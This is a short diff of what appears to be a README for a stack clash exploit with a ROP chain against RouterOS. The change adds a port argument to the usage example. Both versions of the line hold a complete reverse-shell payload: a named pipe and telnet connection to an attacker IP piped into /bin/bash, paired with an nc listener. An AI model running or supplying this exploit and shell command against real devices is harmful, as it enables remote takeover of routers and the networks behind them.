@@ -22,7 +22,7 @@ Stack clash exploit using two threads  with ROP chain to run bash commands
 For a reverse shell:  
 ```
 $ nc -l -p 1234
-$ ./StackClashROPsystem.py 192.168.8.1 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
+$ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
 ```
 Where:  
 - RouterOS IP: 192.168.8.1  
